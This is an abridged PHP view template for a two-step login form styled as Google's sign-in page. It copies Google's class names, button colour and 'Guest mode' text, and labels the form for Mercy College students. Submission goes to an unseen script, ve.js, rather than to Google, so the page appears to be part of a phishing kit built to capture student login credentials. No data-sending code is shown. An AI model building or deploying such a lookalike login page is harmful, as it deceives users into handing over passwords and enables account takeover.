<?php $this->view("./components/Header"); ?>
    ...
    <?php $this->view("./components/Nav"); ?>
            ...
            <div class="Main">
                <div class="mini-container"> 
                    <div class="login-widget-g">
                        ...
                        <form method="POST" class="form-group" id="__LoginMercyCollegeStudent" autocomplete="off" action="javascript:void(0)">
                            <div class="element-cpanel1 cpanel1">
                                ...
                                <div class="PrDSKc">Not your computer? Use Guest mode to sign in privately. 
                                    <a href="javascript:void(0)" class="link-c" jsname="JFyozc" target="_blank">Learn more</a>
                                </div>
                                <div class="flex-container element-btn ">
                                    ...
                                    <div class="pull-right">
                                        <button type="submit" value="Login"  class="btn_button btn-google btn-primary pull-left" style="background:#1a73e8">Next</button>
                                    </div>                
                                </div>
                            </div>
                            <div class="element-cpanel2 cpanel2" style="display:none">
                                ...
                                <div class="mt-4 mb-4">
                                    <svg style="color: #d93025;display:none; "" aria-hidden="true" class="stUf5b qpSchb" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
                                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z" style="margin-top:12px;"></path>
                                    </svg>
                                ...
                                <div class="pull-right">
                                    <button type="submit" value="Login"  class="btn_button btn-googleSubmint btn-google btn-primary pull-left" style="background:#1a73e8">Login</button>
                                </div>                
                            </div>
                            </div>
                        </form>
        ...
        <script type="module" src="<?=ASSETS?>js/ve.js"></script>
    </body>
</html>